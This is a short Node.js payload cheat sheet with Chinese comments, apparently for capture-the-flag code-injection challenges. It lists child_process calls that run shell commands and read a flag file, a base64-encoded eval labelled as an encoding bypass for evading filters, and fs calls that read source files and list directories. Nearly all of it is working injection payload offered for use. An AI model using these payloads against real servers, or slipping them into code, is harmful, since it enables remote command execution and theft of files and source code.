
```node
// shell 执行
require('child_process').execSync('ls').toString();
require('child_process').spawnSync('ls').stdout;
require('child_process').spawnSync('tac', ['fl001g.txt']).stdout;
// 编码绕过
// require('child_process').execSync('ls')
eval(Buffer.from("cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdscycp",'base64').toString('ascii'))


// 读取文件
require('fs').readFileSync('app.js').toString();
// 读取目录
require('fs').readdirSync('.').toString();
```